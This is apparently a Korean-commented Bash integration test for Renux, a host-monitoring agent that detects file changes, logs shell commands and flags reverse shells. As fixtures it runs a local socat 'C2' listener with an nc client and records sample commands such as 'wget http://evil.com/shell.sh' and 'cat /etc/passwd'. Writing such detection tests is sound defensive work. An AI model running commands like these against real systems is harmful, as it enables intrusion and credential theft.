#!/bin/bash
# Renux V2.1 모니터링 기능 통합 테스트
# 실행: docker run --rm --privileged renux:test bash test/test_monitoring.sh

PASS=0
FAIL=0

GREEN='\033[0;32m'
RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

ok()   { echo -e "${GREEN}[PASS]${NC} $1"; PASS=$((PASS+1)); }
fail() { echo -e "${RED}[FAIL]${NC} $1"; FAIL=$((FAIL+1)); }
info() { echo -e "${CYAN}[INFO]${NC} $1"; }

AGENT_LOG="/var/log/renux.log"
MASTER_LOG="/renux/central_renux.log"

# ── 환경 준비 ────────────────────────────────────────────────────────
echo "============================================"
echo "  Renux 모니터링 기능 통합 테스트"
echo "============================================"
echo ""

# 이전 로그 초기화
> "$AGENT_LOG"
> "$MASTER_LOG" 2>/dev/null || true
mkdir -p /home/testuser

# ── renux_master 기동 ────────────────────────────────────────────────
info "renux_master 기동 중..."
./renux_master > "$MASTER_LOG" 2>&1 &
MASTER_PID=$!
sleep 1

if ! kill -0 $MASTER_PID 2>/dev/null; then
    fail "renux_master 기동 실패 — 이하 테스트 불가"
    exit 1
fi
info "renux_master PID=$MASTER_PID (port 9000)"

# ── 리버스 쉘 시뮬레이션 사전 준비 (에이전트 기동 전에 연결 확립) ────
info "리버스 쉘 연결 사전 구성 중..."

# 컨테이너의 실제 eth0 IP 사용 (로컬 127.0.0.1이 아닌 외부 인식 IP)
# /proc/net/tcp에서 127.0.0.1·0.0.0.0만 필터링하므로 eth0 IP는 탐지 대상
C2_IP=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet )\d+\.\d+\.\d+\.\d+' | head -1)
if [ -z "$C2_IP" ]; then
    C2_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
fi
info "C2 서버 IP: $C2_IP"

# C2 서버 역할: 연결마다 sleep 60 실행 → 연결을 ESTABLISHED로 유지
socat TCP-LISTEN:6666,bind=$C2_IP,reuseaddr,fork EXEC:'/bin/sleep 60' &>/dev/null &
C2_PID=$!
sleep 1

# 역쉘 클라이언트: nc로 연결 (SHELL_NAMES에 "nc" 포함), /dev/zero로 입력 유지
nc "$C2_IP" 6666 </dev/zero &>/dev/null &
NC_PID=$!
sleep 2

# ESTABLISHED 상태 사전 확인
EST=$(awk 'NR>1 && $4=="01"' /proc/net/tcp 2>/dev/null)
if echo "$EST" | grep -qv "0100007F"; then
    info "비-루프백 ESTABLISHED 연결 확인됨 — 에이전트 기동"
else
    info "ESTABLISHED 연결 없음 — nc/socat 실패 가능성"
    info "현재 TCP 상태: $(awk 'NR>1' /proc/net/tcp | awk '{print $3,$4}' | head -3)"
fi

# ── renux 에이전트 기동 ──────────────────────────────────────────────
info "renux 에이전트 기동 중..."
echo "MASTER_IP=127.0.0.1" > /etc/renux.conf
echo "MASTER_PORT=9000"   >> /etc/renux.conf

./renux > /dev/null 2>&1 &
AGENT_PID=$!
sleep 3  # inotify 셋업 + master 연결 대기 + 탐지 스레드 초기 스캔

if ! kill -0 $AGENT_PID 2>/dev/null; then
    fail "renux 에이전트 기동 실패"
    exit 1
fi
info "renux 에이전트 PID=$AGENT_PID"
echo ""

# ════════════════════════════════════════════════════════════════════
# [1] 파일 생성 탐지
# ════════════════════════════════════════════════════════════════════
echo "--- [1] 파일 생성 탐지 (inotify IN_CREATE) ---"
info "파일 생성: /root/secret.txt"
echo "sensitive data" > /root/secret.txt
sleep 2

if grep -q "FILE\|MODIFIED\|secret.txt\|CREATE" "$AGENT_LOG" 2>/dev/null; then
    ok "파일 생성 이벤트 로그에 기록됨"
    grep "secret.txt" "$AGENT_LOG" | tail -1 | sed 's/^/    /'
else
    fail "파일 생성 이벤트 미탐지"
fi
echo ""

# ════════════════════════════════════════════════════════════════════
# [2] 파일 수정 탐지 + diff 로깅
# ════════════════════════════════════════════════════════════════════
echo "--- [2] 파일 수정 탐지 + diff 로깅 ---"
info "파일 수정: /root/secret.txt에 내용 추가"
# 먼저 파일을 열어서 backup이 생기도록 기다림
sleep 1
echo "added malicious content" >> /root/secret.txt
sleep 2

if grep -q "FILE MODIFIED\|MODIFIED" "$AGENT_LOG" 2>/dev/null; then
    ok "파일 수정 이벤트 탐지됨"
    grep "FILE MODIFIED\|MODIFIED" "$AGENT_LOG" | tail -1 | sed 's/^/    /'
else
    fail "파일 수정 이벤트 미탐지"
fi

# diff 내용이 로그에 포함되었는지 확인
if grep -q "^+" "$AGENT_LOG" 2>/dev/null || grep -q "diff\|---\|+++" "$AGENT_LOG" 2>/dev/null; then
    ok "diff 내용이 로그에 포함됨"
else
    fail "diff 내용 미기록"
fi
echo ""

# ════════════════════════════════════════════════════════════════════
# [3] 쉘 명령 로깅 (.renux_history)
# ════════════════════════════════════════════════════════════════════
echo "--- [3] 쉘 명령 로깅 (.renux_history PROMPT_COMMAND 훅) ---"
info "root .renux_history에 명령 기록 시뮬레이션"

# .renux_history에 직접 쓰기 (PROMPT_COMMAND 훅이 하는 것과 동일)
echo "cat /etc/passwd" >> /root/.renux_history
echo "wget http://evil.com/shell.sh" >> /root/.renux_history
sleep 2

if grep -q "cat /etc/passwd\|wget" "$AGENT_LOG" 2>/dev/null; then
    ok "쉘 명령 로그 캡처됨"
    grep "SHELL\|renux_history" "$AGENT_LOG" | tail -2 | sed 's/^/    /'
else
    fail "쉘 명령 미캡처"
fi
echo ""

# ════════════════════════════════════════════════════════════════════
# [4] 리버스 쉘 탐지 (/proc/net/tcp → inode → pid)
# ════════════════════════════════════════════════════════════════════
echo "--- [4] 리버스 쉘 탐지 (/proc/net/tcp) ---"
info "에이전트 기동 전 nc 연결 이미 구성됨 (탐지 스레드 초기 스캔 대상)"

# 초기 스캔 결과 확인 (에이전트 시작 직후 즉시 스캔)
for i in $(seq 1 8); do
    if grep -q "REVERSE_SHELL\|ALERT.*nc\|ALERT.*REVERSE" "$AGENT_LOG" 2>/dev/null; then
        break
    fi
    sleep 1
done

if grep -q "REVERSE_SHELL\|ALERT.*nc\|ALERT.*REVERSE" "$AGENT_LOG" 2>/dev/null; then
    ok "리버스 쉘 ALERT 탐지됨 (초기 스캔)"
    grep "ALERT\|REVERSE" "$AGENT_LOG" | tail -2 | sed 's/^/    /'
else
    info "초기 스캔 미탐지 — 다음 주기 스캔 대기 중 (최대 32초)..."
    for i in $(seq 1 32); do
        if grep -q "REVERSE_SHELL\|ALERT.*nc\|ALERT.*REVERSE" "$AGENT_LOG" 2>/dev/null; then
            break
        fi
        sleep 1
    done

    if grep -q "REVERSE_SHELL\|ALERT.*nc\|ALERT.*REVERSE" "$AGENT_LOG" 2>/dev/null; then
        ok "리버스 쉘 ALERT 탐지됨 (2차 스캔)"
        grep "ALERT\|REVERSE" "$AGENT_LOG" | tail -2 | sed 's/^/    /'
    else
        fail "리버스 쉘 미탐지"
        info "/proc/net/tcp ESTABLISHED 연결:"
        awk 'NR>1 && $4=="01" {print "    "$0}' /proc/net/tcp 2>/dev/null | head -5
    fi
fi

kill $NC_PID   2>/dev/null || true
kill $C2_PID   2>/dev/null || true
echo ""

# ════════════════════════════════════════════════════════════════════
# [5] 로그 스트리밍 (renux → renux_master TLS)
# ════════════════════════════════════════════════════════════════════
echo "--- [5] 로그 스트리밍 검증 (renux → renux_master TLS) ---"
sleep 2

if [ -s "$MASTER_LOG" ]; then
    LINE_COUNT=$(grep -c "Agent:" "$MASTER_LOG" 2>/dev/null || echo 0)
    if [ "$LINE_COUNT" -gt 0 ]; then
        ok "renux_master가 에이전트 로그 수신 (${LINE_COUNT}건)"
        tail -3 "$MASTER_LOG" | sed 's/^/    /'
    else
        fail "renux_master 로그 수신 없음"
    fi
else
    fail "central_renux.log 비어 있음 (TLS 스트리밍 실패)"
fi
echo ""

# ════════════════════════════════════════════════════════════════════
# [6] .bashrc 훅 주입 확인
# ════════════════════════════════════════════════════════════════════
echo "--- [6] .bashrc PROMPT_COMMAND 훅 주입 확인 ---"

if grep -q "PROMPT_COMMAND\|renux_history\|renux" /root/.bashrc 2>/dev/null; then
    ok "root .bashrc에 훅 주입 확인"
    grep "PROMPT_COMMAND\|renux" /root/.bashrc | head -2 | sed 's/^/    /'
else
    fail "root .bashrc 훅 미주입"
fi

if [ -d /home/testuser ]; then
    if grep -q "PROMPT_COMMAND\|renux" /home/testuser/.bashrc 2>/dev/null; then
        ok "testuser .bashrc에 훅 주입 확인"
    else
        fail "testuser .bashrc 훅 미주입"
    fi
fi
echo ""

# ── 정리 ────────────────────────────────────────────────────────────
kill $AGENT_PID  2>/dev/null || true
kill $MASTER_PID 2>/dev/null || true
sleep 1

# ── 결과 요약 ────────────────────────────────────────────────────────
echo "============================================"
echo "  결과: PASS=${PASS}  FAIL=${FAIL}"
echo "============================================"
echo ""
echo "--- 에이전트 로그 (마지막 10줄) ---"
tail -10 "$AGENT_LOG" | sed 's/^/  /'

if [ $FAIL -gt 0 ]; then exit 1; fi
